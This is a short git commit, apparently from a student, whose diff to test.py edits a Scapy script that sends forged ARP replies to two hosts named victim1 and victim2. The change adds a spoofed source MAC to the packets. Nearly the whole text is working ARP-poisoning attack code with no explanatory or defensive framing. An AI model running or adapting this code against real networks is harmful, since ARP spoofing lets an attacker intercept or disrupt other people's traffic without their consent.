c2fc18787d373187a6309d02a20c818eed3914db
ahugo <hugo.andriamampianina@ynov.com>
2022-11-07 16:18:59 +0100

    .\test.py

--- test.py
+++ test.py
@@ -27,7 +27,7 @@ false_IP = "10.5.1.12"
 false_MAC = "08:00:27:ed:37:22"
 
 
-spoof_arp_victim1 = ARP(op=2, psrc=false_IP, hwdst=victim1_MAC, pdst=victim1_IP)
+spoof_arp_victim1 = ARP(op=2, hwsrc = false_MAC, psrc=false_IP, hwdst=victim1_MAC, pdst=victim1_IP)
 send_spoof1 = send(spoof_arp_victim1)
-spoof_arp_victim2 = ARP(op=2, psrc=false_IP, hwdst=victim2_MAC, pdst=victim2_IP)
+spoof_arp_victim2 = ARP(op=2, hwsrc = false_MAC, psrc=false_IP, hwdst=victim2_MAC, pdst=victim2_IP)
 send_spoof2 = send(spoof_arp_victim2)
